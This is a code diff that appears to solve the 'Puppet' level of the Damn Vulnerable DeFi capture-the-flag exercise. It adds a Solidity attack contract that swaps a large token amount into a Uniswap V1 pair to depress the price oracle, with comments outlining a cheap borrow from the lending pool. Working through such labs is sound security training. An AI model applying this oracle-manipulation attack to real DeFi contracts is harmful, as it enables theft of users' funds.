@@ -1,6 +1,7 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
 
+import "hardhat/console.sol";
 import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
 import "@openzeppelin/contracts/utils/Address.sol";
 import "../DamnValuableToken.sol";
@@ -61,4 +62,43 @@ contract PuppetPool is ReentrancyGuard {
         // calculates the price of the token in wei according to Uniswap pair
         return uniswapPair.balance * (10 ** 18) / token.balanceOf(uniswapPair);
     }
+}
+
+interface IUniswapExchangeV1 {
+    function tokenToEthTransferInput(uint256 tokens_sold, uint256 min_eth, uint256 deadline, address recipient) external returns(uint256);
+}
+
+contract Puppet1Attack {
+
+    address uniswapPairAddress;
+    DamnValuableToken dvtToken;
+    address player;
+    PuppetPool puppetPool; 
+    
+    uint dvtAmount = 1000 ether;
+    
+    constructor(address _dvtToken, address _uniswapPairAddress, PuppetPool _puppetPool, address _player) {
+        dvtToken = DamnValuableToken(_dvtToken);
+        uniswapPairAddress = _uniswapPairAddress;
+        puppetPool = _puppetPool;
+        player = _player;
+        dvtToken.transferFrom(player, address(this), dvtAmount);
+    }
+
+    function attack() public{
+        console.log("uniswapPairAddress", uniswapPairAddress);
+        IUniswapExchangeV1(uniswapPairAddress).tokenToEthTransferInput(dvtAmount, 9 ether, block.timestamp + 1, address(this));
+        console.log("address(this).balance", address(this).balance); 
+
+    }
+
+    
+
+    // puppet pool: 100000 DVT
+    // uniswap pool:  10 ETH, 10 DVT
+    // this balance: 25 ETH, 1000 DVT
+
+    // attack senario
+    // deposit all DVT to uniswap to lower the price
+    // PuppetPool: borrow => deposit ETH and get DVT
 }
